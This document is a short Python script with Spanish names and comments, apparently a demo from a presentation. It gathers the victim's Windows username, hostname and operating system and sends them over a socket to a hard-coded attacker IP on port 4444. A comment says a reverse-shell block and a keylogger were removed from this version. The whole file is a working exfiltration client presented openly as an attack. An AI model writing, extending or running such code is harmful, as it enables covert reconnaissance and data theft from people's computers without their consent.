import socket
import os
import platform

IP_ATACANTE = "192.168.10.20"
PUERTO = 4444

def recolectar_info():
    usuario = os.getlogin()
    equipo = socket.gethostname()
    sistema = platform.system()
    return f"Usuario de windows: {usuario} | Nombre del PC: {equipo} | SO: {sistema}"

def hackear_y_enviar():
    cliente = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        cliente.connect((IP_ATACANTE, PUERTO))
        info_robada = recolectar_info()
        cliente.send(info_robada.encode('utf-8'))
        
        # Nota del productor: Aquí es donde iba tu bloque de Reverse Shell 
        # (el subprocess) y tu Keylogger que seccionaste en la presentación.
        
    except Exception as e:
        # Le quitamos el silenciador (pass) para que el código grite si falla
        print("[-] El código tronó por esto:", e)
    finally:
        cliente.close()

if __name__=="__main__":
    hackear_y_enviar()